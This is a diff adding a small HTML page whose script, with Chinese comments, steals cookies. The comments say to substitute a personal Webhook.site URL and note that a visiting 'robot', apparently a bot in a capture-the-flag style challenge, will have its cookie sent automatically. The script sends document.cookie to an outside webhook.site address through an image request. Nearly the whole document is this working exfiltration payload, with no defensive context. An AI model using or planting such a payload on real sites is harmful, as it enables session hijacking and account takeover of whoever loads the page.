@@ -1,0 +1,10 @@
+<html>
+<body>
+<script>
+// 这里替换成你刚才从Webhook.site复制的专属地址
+const receiveUrl = "https://webhook.site/eef117db-eff2-4a9c-a36b-3b542176bc88";
+// 机器人访问这个页面时，自动把它的cookie发过去
+new Image().src = receiveUrl + "?robot_cookie=" + encodeURIComponent(document.cookie);
+</script>
+</body>
+</html>
